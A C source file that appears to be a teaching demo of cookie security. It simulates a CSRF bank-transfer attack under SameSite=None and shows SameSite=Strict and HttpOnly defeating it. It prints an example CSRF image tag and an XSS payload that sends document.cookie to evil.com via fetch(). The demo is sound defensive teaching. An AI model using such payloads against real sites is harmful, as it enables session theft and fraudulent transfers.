#include "csrf_demo.h"
#include "cookie.h"
#include "session.h"
#include <stdio.h>
#include <string.h>

/* ── CSRF Attack Simulation ─────────────────────────────────────────── */

void csrf_demo_attack(void) {
    printf("\n── CSRF Attack (SameSite=None) ─────────────────────────\n");

    /* Victim logs into bank.example.com */
    struct session_store store;
    memset(&store, 0, sizeof(store));
    long now = 1750000000L;

    struct session *sess = session_create(&store, "alice", now);
    printf("Alice logs into bank.example.com\n");
    printf("  Session token: %.16s...\n", sess->token);

    /* Server sets cookie: SameSite=None */
    struct cookie_jar jar;
    memset(&jar, 0, sizeof(jar));

    struct cookie session_cookie = {
        .name      = "session",
        .domain    = "bank.example.com",
        .path      = "/",
        .http_only = 1,
        .secure    = 1,
        .same_site = 0,  /* SameSite=None — VULNERABLE */
        .expires   = -1
    };
    strncpy(session_cookie.value, sess->token, sizeof(session_cookie.value) - 1);
    cookie_jar_add(&jar, &session_cookie);

    printf("  Set-Cookie: session=%s; HttpOnly; Secure; SameSite=None\n\n",
           sess->token);

    /* Alice visits evil.com which has:
       <img src="https://bank.example.com/transfer?to=attacker&amount=1000">
       This is a cross-site sub-resource request (not top-level nav). */
    printf("Alice visits evil.com, which contains:\n");
    printf("  <img src=\"https://bank.example.com/transfer?to=attacker&amount=1000\">\n\n");

    struct cookie sent[8];
    int count = cookie_jar_get(&jar,
                               "https",
                               "bank.example.com",
                               "/transfer",
                               1, /* is_cross_site */
                               0, /* NOT a top-level nav */
                               sent, 8);

    printf("Browser sends GET /transfer?to=attacker&amount=1000\n");
    printf("  Cookie header contains %d cookie(s):\n", count);
    for (int i = 0; i < count; i++) {
        printf("  Cookie: %s=%s\n", sent[i].name, sent[i].value);
    }

    if (count > 0) {
        /* Verify the session (bank processes the request) */
        struct session *s = session_lookup(&store, sent[0].value, now);
        if (s) {
            printf("\n  Bank server: session valid for user '%s'\n", s->username);
            printf("  *** TRANSFER PROCESSED: $1000 sent to attacker ***\n");
            printf("  *** CSRF ATTACK SUCCEEDED ***\n");
        }
    }
}

void csrf_demo_fix(void) {
    printf("\n── CSRF Fix (SameSite=Strict) ──────────────────────────\n");

    struct session_store store;
    memset(&store, 0, sizeof(store));
    long now = 1750000000L;

    struct session *sess = session_create(&store, "alice", now);

    struct cookie_jar jar;
    memset(&jar, 0, sizeof(jar));

    struct cookie session_cookie = {
        .name      = "session",
        .domain    = "bank.example.com",
        .path      = "/",
        .http_only = 1,
        .secure    = 1,
        .same_site = 2,  /* SameSite=Strict */
        .expires   = -1
    };
    strncpy(session_cookie.value, sess->token, sizeof(session_cookie.value) - 1);
    cookie_jar_add(&jar, &session_cookie);

    printf("Server now sets: SameSite=Strict\n\n");

    printf("evil.com again triggers:\n");
    printf("  <img src=\"https://bank.example.com/transfer?to=attacker&amount=1000\">\n\n");

    struct cookie sent[8];
    int count = cookie_jar_get(&jar,
                               "https",
                               "bank.example.com",
                               "/transfer",
                               1, /* is_cross_site */
                               0, /* NOT top-level nav */
                               sent, 8);

    printf("Browser sends GET /transfer?to=attacker&amount=1000\n");
    printf("  Cookie header contains %d cookie(s) (SameSite=Strict blocks cross-site)\n",
           count);

    if (count == 0) {
        printf("  No session cookie sent.\n");
        printf("  Bank server receives request with no authentication.\n");
        printf("  *** CSRF ATTACK BLOCKED ***\n");
    }
}

void csrf_demo_httponly(void) {
    printf("\n── HttpOnly: XSS Cannot Steal the Session Cookie ───────\n");

    struct cookie http_only_cookie = {
        .name      = "session",
        .value     = "supersecrettoken",
        .http_only = 1,
        .secure    = 1,
        .same_site = 2
    };

    struct cookie plain_cookie = {
        .name      = "analytics",
        .value     = "track123",
        .http_only = 0,
        .secure    = 0,
        .same_site = 1
    };

    printf("JS executes: document.cookie\n");
    printf("  'session' cookie: JS readable = %s\n",
           cookie_js_readable(&http_only_cookie) ? "YES (DANGEROUS)" : "NO (protected)");
    printf("  'analytics' cookie: JS readable = %s\n",
           cookie_js_readable(&plain_cookie) ? "YES" : "NO");
    printf("\nXSS payload: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n");
    printf("  Can steal 'session' cookie: %s\n",
           cookie_js_readable(&http_only_cookie) ? "YES" : "NO — HttpOnly prevents this");
    printf("  Can steal 'analytics' cookie: %s\n",
           cookie_js_readable(&plain_cookie) ? "YES" : "NO");
    printf("\nConclusion: HttpOnly is defense-in-depth against XSS cookie theft.\n"
           "It doesn't prevent XSS but limits the damage.\n");
}
